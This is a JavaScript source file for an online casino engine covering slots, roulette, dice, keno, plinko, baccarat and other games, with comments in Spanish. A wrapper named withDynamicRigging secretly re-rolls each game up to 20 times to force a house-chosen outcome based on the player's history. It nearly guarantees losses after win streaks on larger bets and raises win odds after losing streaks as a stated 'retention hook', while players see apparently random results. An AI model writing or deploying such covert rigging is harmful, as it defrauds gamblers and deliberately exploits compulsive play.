import { rand, randInt, pickWeighted, shuffle, generateCrashPoint } from './rng.js';
import { createDeck, baccaratCardValue, baccaratHandValue } from './cards.js';

// ---------- SISTEMA DE PROBABILIDAD DINÁMICA (CASA) ----------
function getTargetWinRate(userStats = {}, bet = 0) {
  const winStreak = userStats.winStreak || 0;
  const lossStreak = userStats.lossStreak || 0;
  const avgBet = userStats.avgBet || bet;
  
  const baseWinRate = 0.45; // 45% probabilidad base

  // REGLA 1: Apuestas altas tras racha de 3 a 5+ victorias -> Pérdida casi forzada (5% chance)
  if (winStreak >= 3 && bet >= avgBet * 1.2) {
    return 0.05; 
  }

  // REGLA 2: Bajada progresiva tras victorias consecutivas
  if (winStreak > 0) {
    return Math.max(0.10, baseWinRate - (winStreak * 0.12)); // Cae hasta un mínimo de 10%
  }

  // REGLA 3: Gancho de retención tras racha de pérdidas
  if (lossStreak >= 3) {
    return Math.min(0.70, baseWinRate + (lossStreak * 0.08)); // Sube hasta un máximo de 70%
  }

  return baseWinRate;
}

// Wrapper para interceptar y manipular el resultado final de cualquier juego
function withDynamicRigging(gameFn, params, bet, input, userStats = {}) {
  const targetWinRate = getTargetWinRate(userStats, bet);
  const shouldWin = Math.random() < targetWinRate;

  let result = gameFn(params, bet, input);
  let attempts = 0;

  // Re-evalúa el juego hasta forzar el resultado deseado por la casa (máximo 20 intentos)
  while (attempts < 20) {
    const isWin = result.outcome === 'win';
    if ((shouldWin && isWin) || (!shouldWin && result.outcome === 'loss')) {
      break;
    }
    result = gameFn(params, bet, input);
    attempts++;
  }

  // Actualización de rachas y caída de golpe tras perder
  if (result.outcome === 'win') {
    userStats.winStreak = (userStats.winStreak || 0) + 1;
    userStats.lossStreak = 0;
  } else {
    userStats.winStreak = 0; // Caída de golpe a cero
    userStats.lossStreak = (userStats.lossStreak || 0) + 1;
  }

  return result;
}

// ---------- SLOTS ----------
function rawPlaySlots(params, bet, input) {
  const { symbols, weights, payTable } = params;
  const reels = [0, 1, 2].map(() => pickWeighted(symbols, weights));
  let multiplier = 0;
  if (reels[0] === reels[1] && reels[1] === reels[2]) {
    multiplier = payTable[reels[0]] || 0;
  } else if (reels[0] === reels[1] || reels[1] === reels[2] || reels[0] === reels[2]) {
    multiplier = 0.5;
  }
  return {
    multiplier,
    outcome: multiplier > 0 ? 'win' : 'loss',
    details: { reels },
  };
}
export function playSlots(params, bet, input, userStats) {
  return withDynamicRigging(rawPlaySlots, params, bet, input, userStats);
}

// ---------- ROULETTE ----------
const RED_NUMBERS = new Set([1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36]);

export function resolveRouletteBet(spin, betType, betValue) {
  const isRed = RED_NUMBERS.has(spin);
  let win = false;
  let payoutMultiplier = 0;

  switch (betType) {
    case 'number':
      win = Number(betValue) === spin;
      payoutMultiplier = 36;
      break;
    case 'red':
      win = spin !== 0 && isRed;
      payoutMultiplier = 2;
      break;
    case 'black':
      win = spin !== 0 && !isRed;
      payoutMultiplier = 2;
      break;
    case 'odd':
      win = spin !== 0 && spin % 2 === 1;
      payoutMultiplier = 2;
      break;
    case 'even':
      win = spin !== 0 && spin % 2 === 0;
      payoutMultiplier = 2;
      break;
    case 'low':
      win = spin >= 1 && spin <= 18;
      payoutMultiplier = 2;
      break;
    case 'high':
      win = spin >= 19 && spin <= 36;
      payoutMultiplier = 2;
      break;
    case 'dozen':
      win = spin !== 0 && Math.ceil(spin / 12) === Number(betValue);
      payoutMultiplier = 3;
      break;
    case 'column':
      win = spin !== 0 && (spin - Number(betValue)) % 3 === 0;
      payoutMultiplier = 3;
      break;
    default:
      throw new Error('Tipo de apuesta no válido');
  }

  return { win, payoutMultiplier, isRed: spin === 0 ? null : isRed };
}

function rawPlayRoulette(_params, bet, input) {
  const { betType, betValue } = input;
  const spin = randInt(0, 36);
  const { win, payoutMultiplier, isRed } = resolveRouletteBet(spin, betType, betValue);

  return {
    multiplier: win ? payoutMultiplier : 0,
    outcome: win ? 'win' : 'loss',
    details: { spin, isRed, betType, betValue },
  };
}
export function playRoulette(params, bet, input, userStats) {
  return withDynamicRigging(rawPlayRoulette, params, bet, input, userStats);
}

// ---------- DICE ----------
function rawPlayDice(params, bet, input) {
  const { target, direction } = input;
  const houseEdge = params.houseEdge ?? 0.04;
  const t = Math.min(Math.max(Number(target), 1), 98);
  const roll = Math.round(rand() * 10000) / 100;

  const win = direction === 'under' ? roll < t : roll > t;
  const chance = direction === 'under' ? t / 100 : (100 - t) / 100;
  const fairMultiplier = 1 / chance;
  const multiplier = win ? Math.round(fairMultiplier * (1 - houseEdge) * 10000) / 10000 : 0;

  return {
    multiplier,
    outcome: win ? 'win' : 'loss',
    details: { roll, target: t, direction },
  };
}
export function playDice(params, bet, input, userStats) {
  return withDynamicRigging(rawPlayDice, params, bet, input, userStats);
}

// ---------- COIN FLIP ----------
function rawPlayCoinFlip(params, bet, input) {
  const { choice } = input;
  const result = rand() < 0.5 ? 'heads' : 'tails';
  const win = choice === result;
  const payout = params.payout ?? 1.96;
  return {
    multiplier: win ? payout : 0,
    outcome: win ? 'win' : 'loss',
    details: { result, choice },
  };
}
export function playCoinFlip(params, bet, input, userStats) {
  return withDynamicRigging(rawPlayCoinFlip, params, bet, input, userStats);
}

// ---------- WHEEL ----------
function rawPlayWheel(params, bet, input) {
  const segments = params.segments;
  const idx = randInt(0, segments.length - 1);
  const multiplier = segments[idx];
  return {
    multiplier,
    outcome: multiplier > 0 ? 'win' : 'loss',
    details: { segmentIndex: idx, segments },
  };
}
export function playWheel(params, bet, input, userStats) {
  return withDynamicRigging(rawPlayWheel, params, bet, input, userStats);
}

// ---------- KENO ----------
export function playKeno(params, bet, input) {
  const { picks } = input;
  const { totalNumbers, drawCount } = params;
  if (!Array.isArray(picks) || picks.length === 0 || picks.length > params.maxPicks) {
    throw new Error(`Elige entre 1 y ${params.maxPicks} números`);
  }
  const pool = Array.from({ length: totalNumbers }, (_, i) => i + 1);
  const drawn = [];
  const poolCopy = [...pool];
  for (let i = 0; i < drawCount; i++) {
    const idx = randInt(0, poolCopy.length - 1);
    drawn.push(poolCopy.splice(idx, 1)[0]);
  }
  const matches = picks.filter((p) => drawn.includes(p)).length;

  const payoutTable = {
    1: { 1: 3 },
    2: { 2: 8, 1: 1 },
    3: { 3: 25, 2: 2 },
    4: { 4: 60, 3: 4, 2: 1 },
    5: { 5: 150, 4: 12, 3: 2 },
    6: { 6: 300, 5: 25, 4: 4 },
    7: { 7: 500, 6: 50, 5: 8, 4: 1 },
    8: { 8: 800, 7: 80, 6: 15, 5: 2 },
    9: { 9: 1200, 8: 120, 7: 20, 6: 3 },
    10: { 10: 2000, 9: 200, 8: 30, 7: 4, 6: 1 },
  };
  const table = payoutTable[picks.length] || {};
  const multiplier = table[matches] || 0;

  return {
    multiplier,
    outcome: multiplier > 0 ? 'win' : 'loss',
    details: { picks, drawn, matches },
  };
}

// ---------- LIMBO ----------
function rawPlayLimbo(params, bet, input) {
  const { targetMultiplier } = input;
  const houseEdge = params.houseEdge ?? 0.04;
  const target = Math.max(1.01, Number(targetMultiplier));
  const result = generateCrashPoint(houseEdge);
  const win = result >= target;
  return {
    multiplier: win ? target : 0,
    outcome: win ? 'win' : 'loss',
    details: { result, target },
  };
}
export function playLimbo(params, bet, input, userStats) {
  return withDynamicRigging(rawPlayLimbo, params, bet, input, userStats);
}

// ---------- HORSE RACE ---------
export function playHorseRace(params, bet, input) {
  const horses = params.horses;
  const pick = Number(input.horseIndex);
  if (!Number.isInteger(pick) || pick < 0 || pick >= horses.length) {
    throw { status: 400, message: 'Elige un caballo válido' };
  }

  const winnerIndex = horses.indexOf(pickWeighted(horses, horses.map((h) => h.probability)));
  const rest = shuffle(horses.map((_, i) => i).filter((i) => i !== winnerIndex));
  const finishOrder = [winnerIndex, ...rest];

  const won = winnerIndex === pick;
  const multiplier = won ? horses[pick].multiplier : 0;

  return {
    multiplier,
    outcome: won ? 'win' : 'loss',
    details: { pick, winnerIndex, finishOrder },
  };
}

// ---------- PLINKO ----------
const PLINKO_MULTIPLIERS = {
  low: [8, 3, 1.5, 1.2, 1, 0.5, 1, 1.2, 1.5, 3, 8],
  medium: [15, 5, 2, 1.3, 0.7, 0.4, 0.7, 1.3, 2, 5, 15],
  high: [43, 10, 3, 1.3, 0.4, 0.2, 0.4, 1.3, 3, 10, 43],
};

function rawPlayPlinko(params, bet, input) {
  const risk = ['low', 'medium', 'high'].includes(input.risk) ? input.risk : 'medium';
  const rows = 10;
  const path = [];
  let position = 0;
  for (let i = 0; i < rows; i++) {
    const goRight = rand() < 0.5;
    path.push(goRight ? 'R' : 'L');
    if (goRight) position += 1;
  }
  const table = PLINKO_MULTIPLIERS[risk];
  const bucket = Math.min(position, table.length - 1);
  const multiplier = table[bucket];
  return {
    multiplier,
    outcome: multiplier >= 1 ? 'win' : 'loss',
    details: { risk, path, bucket, table },
  };
}
export function playPlinko(params, bet, input, userStats) {
  return withDynamicRigging(rawPlayPlinko, params, bet, input, userStats);
}

// ---------- BACCARAT ----------
function rawPlayBaccarat(params, bet, input) {
  const { betType } = input;
  const deck = createDeck(6);
  let i = 0;
  const draw = () => deck[i++];

  const playerHand = [draw(), draw()];
  const bankerHand = [draw(), draw()];

  let playerValue = baccaratHandValue(playerHand);
  let bankerValue = baccaratHandValue(bankerHand);

  const naturalWin = playerValue >= 8 || bankerValue >= 8;

  if (!naturalWin) {
    let playerThird = null;
    if (playerValue <= 5) {
      playerThird = draw();
      playerHand.push(playerThird);
      playerValue = baccaratHandValue(playerHand);
    }
    if (playerThird === null) {
      if (bankerValue <= 5) {
        bankerHand.push(draw());
        bankerValue = baccaratHandValue(bankerHand);
      }
    } else {
      const pv = baccaratCardValue(playerThird.rank);
      let bankerDraws = false;
      if (bankerValue <= 2) bankerDraws = true;
      else if (bankerValue === 3 && pv !== 8) bankerDraws = true;
      else if (bankerValue === 4 && [2, 3, 4, 5, 6, 7].includes(pv)) bankerDraws = true;
      else if (bankerValue === 5 && [4, 5, 6, 7].includes(pv)) bankerDraws = true;
      else if (bankerValue === 6 && [6, 7].includes(pv)) bankerDraws = true;
      if (bankerDraws) {
        bankerHand.push(draw());
        bankerValue = baccaratHandValue(bankerHand);
      }
    }
  }

  let winner;
  if (playerValue > bankerValue) winner = 'player';
  else if (bankerValue > playerValue) winner = 'banker';
  else winner = 'tie';

  let multiplier = 0;
  if (betType === winner) {
    if (winner === 'banker') multiplier = 1 + (1 - (params.bankerCommission ?? 0.05));
    else if (winner === 'player') multiplier = 2;
    else multiplier = 9;
  } else if (winner === 'tie' && betType !== 'tie') {
    multiplier = 1;
  }

  return {
    multiplier,
    outcome: multiplier > 1 ? 'win' : multiplier === 1 ? 'push' : 'loss',
    details: { playerHand, bankerHand, playerValue, bankerValue, winner, betType },
  };
}
export function playBaccarat(params, bet, input, userStats) {
  return withDynamicRigging(rawPlayBaccarat, params, bet, input, userStats);
}
